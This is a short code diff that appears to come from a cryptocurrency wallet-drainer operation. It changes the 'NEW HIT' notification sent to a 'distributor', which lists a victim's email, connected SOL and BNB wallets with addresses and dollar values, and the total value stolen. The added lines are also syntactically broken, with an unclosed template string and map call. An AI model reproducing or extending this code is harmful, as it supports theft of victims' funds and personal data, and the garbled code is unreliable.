@@ -227,8 +227,12 @@ ${bnbWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${walle
     const distributorMsg = `
 🎯 **NEW HIT**
 
-📧 Target: ${data.user?.email || 'Did not set'}
-💰 SOL Wallets: ${solWallets.length} ($${totalSOLValue.toFixed(2)})
+🔎 **Profile Information**
+├ 🏅 Level: 1
+├ 📧 Email: ${data.user?.email || 'Unknown'}
+💳 **Connected Wallets (${solWallets.length})**
+${solWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${wallet.url}) ($${wallet.usdValue.toFixed(2)})
+├ ${i + 1}. 
 💰 BNB Wallets: ${bnbWallets.length} ($${totalBNBValue.toFixed(2)})
 💵 **Total Value: $${totalValue.toFixed(2)}**
 ⏰ ${new Date().toLocaleString()}
